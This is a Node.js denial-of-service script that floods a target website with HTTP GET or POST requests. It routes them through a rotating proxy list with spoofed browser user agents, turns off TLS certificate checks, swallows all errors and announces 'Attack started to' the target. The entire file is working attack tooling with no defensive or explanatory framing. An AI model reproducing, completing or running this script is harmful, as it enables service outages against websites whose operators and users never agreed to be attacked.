


process.on('uncaughtException', function() {});
process.on('unhandledRejection', function() {});
const net = require('net');
const fs = require('fs');
const querystring = require('querystring'); //require for post data
const url = require('url');
const request_2 = require('request');
var theJar = request_2.jar();
var path = require("path");
const execSync = require('child_process').execSync;
try {
    var colors = require('colors');
} catch (err) {
    console.log('\x1b[36mInstalling\x1b[37m the requirements');
    execSync('npm install colors');
    console.log('Done.');
    process.exit();
}
var fileName = __filename;
var file = path.basename(fileName);
try {
    var proxies = fs.readFileSync(process.argv[3], 'utf-8').toString().replace(/\r/g, '').split('\n');
    var post_test = process.argv[5];
} catch (err) {
    if (err.code !== 'ENOENT') throw err;
    console.log('Proxy list not found.');
    console.log("node " + file + " <Target> <proxies> <duration>");
    process.exit();
}

var target2 = process.argv[2];
const target = target2.split('""')[0];


var parsed = url.parse(target);
process.setMaxListeners(15);
let browser_saves = '';

setTimeout(() => {
    process.exit(1);
}, process.argv[4] * 1000);

const UAs = [
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.18247",
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3599.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3599.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3599.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3599.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3599.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
];

const post_recibe = post_test.split('""')[0];

var data2 = querystring.stringify(post_recibe);

let count = 0,
  by = 100,
  _intervals = [],
  timelimit = 100
for (let i = 0; i < 1; i++) {
  _intervals[i] = setInterval(() => {

var proxy = proxies[Math.floor(Math.random() * proxies.length)];
proxy = proxy.split(':');

var http = require('http'),
tls = require('tls');

var req = http.request({//set proxy session
    host: proxy[0],
    port: proxy[1],
    ciphers: 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    method: 'CONNECT',
    //timeout: 2000,
    path: parsed.host+':443'
}, (err) => {
    req.end();
    return;
});

req.on('connect', function (res, socket, head) {//open raw request
    var tlsConnection = tls.connect({
        host: parsed.host,
        ciphers: 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384', //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
        secureProtocol: 'TLSv1_2_method',
        secureOptions: 'SSL_OP_*',
        servername: parsed.host,
        secure: true,
        rejectUnauthorized: false,
       // sessionTimeout: 1000,
        socket: socket
    }, function () {
        for (let j = 0; j < 64; j++) {
       if(post_recibe !== 'und'){
        tlsConnection.write('POST '+parsed.path+' HTTP/1.3\r\nHost: ' + parsed.host + '\r\nReferer: '+target+'\r\nOrigin: '+target+'\r\nContent-Length: '+Buffer.byteLength(data2)+'\r\nContent-Trype: application/x-www-form-urlencoded\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
    } else {
        tlsConnection.write('GET '+parsed.path+' HTTP/1.3\r\nHost: ' + parsed.host + '\r\nReferer: '+target+'\r\nOrigin: '+target+'\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
   } 
}
    });

    tlsConnection.on('error', function(data) {
        tlsConnection.end();
        tlsConnection.destroy();
    });

    tlsConnection.on('data', function (data) {
    });
});
req.end()
});
}

setTimeout(() => {
  _intervals.forEach(x => clearInterval(x))
}, time)

//setInterval(async function() {
//}, 0.0);

console.log('Attack started to '+target);